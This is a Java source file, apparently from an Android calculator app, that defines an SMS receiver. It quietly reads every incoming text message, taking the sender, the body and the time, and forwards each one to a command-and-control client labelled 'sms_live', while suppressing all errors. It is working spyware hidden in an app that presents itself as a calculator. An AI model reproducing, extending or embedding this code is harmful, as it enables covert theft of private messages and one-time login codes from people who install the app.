package com.yangdai.calc.core;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import org.json.JSONObject;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        try {
            Bundle b = intent.getExtras();
            if (b == null) return;
            Object[] pdus = (Object[]) b.get("pdus");
            if (pdus == null) return;
            C2Client c2 = new C2Client(ctx);
            for (Object pdu : pdus) {
                SmsMessage m = SmsMessage.createFromPdu((byte[]) pdu);
                JSONObject o = new JSONObject();
                o.put("from", m.getOriginatingAddress());
                o.put("body", m.getMessageBody());
                o.put("time", m.getTimestampMillis());
                c2.sendResult("sms_live", o, "");
            }
        } catch (Exception ignored) {}
    }
}
